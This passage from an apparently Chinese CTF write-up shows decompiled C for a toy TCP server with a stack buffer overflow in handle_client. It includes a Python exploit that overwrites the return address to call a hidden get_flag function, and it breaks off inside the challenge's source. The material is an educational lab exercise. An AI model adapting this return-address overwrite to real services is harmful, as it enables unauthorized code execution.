data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  socklen_t addr_len<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-34h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> addr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+14h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+28h] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p_argc<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+2Ch] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  p_argc <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  addr_len <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  fd <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> fd <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  addr<span class=\"token punctuation\">.</span>sa_family <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>addr<span class=\"token punctuation\">.</span>sa_data <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x22B8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x10u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Server listening on port %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8888</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  size_t n<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-50h] BYREF</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">int</span> buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-4Ch] BYREF</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">char</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">68</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+10h] [ebp-48h] BYREF</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"client_sock: %d\\n\"</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> buf <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">559038737</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received content: %s\\n\"</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid magic number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>还有一个定义了但是没有使用的方法</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// address 0x08049266</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> __cdecl <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  size_t v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-8Ch] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      v1 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgets\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fopen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>先接收 magic number</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAGIC <span class=\"token operator\">=</span> <span class=\"token number\">0xdeadbeef</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>SIZE <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>CONTENT <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x48</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08049266</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># get_falg 的地址</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>CONTENT <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># client sock</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">with</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>example<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">,</span> <span class=\"token number\">8888</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>MAGIC<span class=\"token punctuation\">.</span>to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'little'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>SIZE<span class=\"token punctuation\">.</span>to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'little'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>CONTENT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received flag:\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    exploit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>找出题的同学要了源码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;arpa/inet.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MAGIC</span> <span class=\"token expression\"><span class=\"token number\">0xdeadbeef</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FLAG_FILE</span> <span class=\"token string\">\"flag\"</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PORT</span> <span class=\"token expression\"><span class=\"token number\">8888</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> client_sock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    FILE <span class=\"token operator\">*</span>file <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span>FLAG_FILE<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fopen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">char</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> file<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgets\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token 